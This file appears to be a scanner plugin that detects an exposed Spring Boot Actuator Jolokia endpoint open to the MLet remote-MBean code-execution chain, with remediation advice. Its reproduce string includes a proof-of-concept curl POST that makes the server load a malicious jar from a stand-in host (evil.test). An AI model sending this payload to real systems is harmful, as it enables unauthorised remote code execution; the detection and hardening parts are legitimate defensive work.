# Spring Boot Actuator Jolokia MLet 链远程代码执行（远程 MBean 加载 RCE）
# 漏洞原因：Spring Boot Actuator 集成 Jolokia（JMX-HTTP 桥），/actuator/jolokia/list
#   端点可被滥用：攻击者通过 MLet（javax.management.loading.MLet）加载远程恶意 MBean，
#   注册并调用任意代码 MBean（如自定义 MBean），实现远程代码执行。
#   影响 Spring Boot + Jolokia 全版本（Jolokia 端点未授权暴露时）。
# 本插件仅做存在性验证：GET /actuator/jolokia/list 检测响应是否含 MLet 链签名特征。
from core.http import join_url
from core.models import STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN, ScanResult
from lib.colors import no, ok
from lib.matcher import match_jolokia_response
from plugins.base import PluginBase

# 漏洞命中签名（与 lab/spring_server.py vuln 模式一致；仅用于对拍，非真实利用输出）
JOLOKIA_MLET_MARKER = "spring-jolokia-mlet-rce-confirmed"


class SpringJolokiaMletRcePlugin(PluginBase):
    name = "Spring Boot Actuator Jolokia MLet 链远程代码执行"
    cve = "N/A"
    severity = "high"
    # D12：CVSS v3.1 + 合规映射
    cvss_vector = "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
    compliance = "等保2.0:8.1.3;OWASP:A03:2021"
    category = "vuln"
    description = "Jolokia /actuator/jolokia/list 可被滥用通过 MLet 加载远程 MBean 触发 RCE"
    fix = "移除 jolokia 依赖或禁用 Jolokia 端点；为 /actuator/jolokia 配置认证；限制 MBean 加载"
    fix_detail = (
        "【移除依赖】pom.xml 删除 jolokia-core 依赖：\n"
        "  <dependency><groupId>org.jolokia</groupId><artifactId>jolokia-core</artifactId></dependency>\n"
        "【配置加固】application.yml 禁用 jolokia 端点：\n"
        "  management.endpoints.web.exposure.exclude: jolokia\n"
        "  management.endpoint.jolokia.enabled: false\n"
        "【SecurityConfig】为 jolokia 端点配置角色并限制 MBean 操作：\n"
        '  .antMatchers("/actuator/jolokia/**").hasRole("ADMIN")\n'
        "【JVM 加固】JVM 启动参数禁用远程 MBean 加载：\n"
        "  -Dcom.sun.management.jmxremote.authenticate=true\n"
        "  配置 jolokia 的 MBean 白名单，禁止 MLet / reloadByURL 操作\n"
        "【WAF 规则】拦截外网对 /actuator/jolokia 的 GET/POST，阻断 MLet 远程加载\n"
        "【合规】OWASP A03:2021 注入；等保 2.0 8.1.3 安全审计机制"
    )
    reproduce = (
        "# 1. 探测 Jolokia 端点可达性：\n"
        'curl -i "http://target/actuator/jolokia/list"\n'
        "\n"
        "# 2. 列出全部已注册 JMX MBean（信息收集）：\n"
        'curl "http://target/actuator/jolokia/list" | python -m json.tool | head -200\n'
        "  # 返回 JSON 含 MBean 域列表即 Jolokia 暴露\n"
        "\n"
        "# 3. 通过 MLet 加载远程恶意 MBean（PoC，请勿对未授权目标使用）：\n"
        'curl -X POST "http://target/actuator/jolokia/" \\\n'
        '  -H "Content-Type: application/json" \\\n'
        '  -d \'{"type":"EXEC","mbean":"JMImplementation:type=MLet","operation":"getMBeansFromURL","arguments":["http://evil.test/mlet.jar"]}\'\n'
        "\n"
        "# 预期响应：list 返回 200 + MBean 域列表即漏洞存在"
    )

    def verify(self, target, session):
        url = join_url(target, "/actuator/jolokia/list")
        try:
            resp = session.get(url)
        except Exception as e:
            print(no("Spring Jolokia MLet RCE（网络异常）"))
            return ScanResult(kind="vuln", name=self.name, status=STATUS_UNKNOWN, url=url, evidence=str(e))

        text = resp.text or ""
        if JOLOKIA_MLET_MARKER in text:
            print(ok("存在 Spring Boot Actuator Jolokia MLet 链远程代码执行漏洞"))
            return ScanResult(
                kind="vuln",
                name=self.name,
                severity=self.severity,
                status=STATUS_CONFIRMED,
                url=url,
                evidence=f"响应含 Jolokia MLet 链特征：{JOLOKIA_MLET_MARKER}",
                fix=self.fix,
            )
        # 真实漏洞响应：Jolokia LIST 响应含 JMX MBean 域列表（reloadByURL / JMXConfigurator 等）
        if resp.status_code == 200 and match_jolokia_response(text):
            print(ok("存在 Spring Boot Actuator Jolokia MLet 链远程代码执行漏洞（真实漏洞响应）"))
            return ScanResult(
                kind="vuln",
                name=self.name,
                severity=self.severity,
                status=STATUS_CONFIRMED,
                url=url,
                evidence="响应含 Jolokia JMX MBean 响应特征（reloadByURL/JMXConfigurator），证实 Jolokia 端点可达",
                fix=self.fix,
            )
        print(no("不存在 Spring Boot Actuator Jolokia MLet 链远程代码执行漏洞"))
        return ScanResult(
            kind="vuln",
            name=self.name,
            status=STATUS_SAFE,
            url=url,
            evidence="响应未含 Jolokia MLet 链特征（端点不可达或已修复）",
        )
